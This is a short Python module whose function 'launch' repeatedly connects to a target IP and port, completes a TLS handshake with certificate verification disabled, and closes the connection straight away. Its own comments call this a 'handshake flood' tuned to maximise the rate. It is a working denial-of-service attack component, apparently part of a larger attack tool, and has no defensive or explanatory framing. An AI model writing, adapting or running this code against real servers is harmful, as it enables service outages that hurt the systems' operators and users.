import socket
import ssl
import time

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    start_time = time.time()
    failed = 0

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        try:
            # Create socket connection
            sock = socket.create_connection((target_ip, port), timeout=3)

            # Initiate SSL handshake (wrap socket)
            ssock = context.wrap_socket(sock, server_hostname=target_ip)

            # Immediately close to maximize handshake rate
            ssock.close()
        except Exception:
            failed += 1
            if failed > 20:
                fail_tracker.append(tag)
                break

        # Minimal delay to maximize handshake flood rate
        time.sleep(0.05)
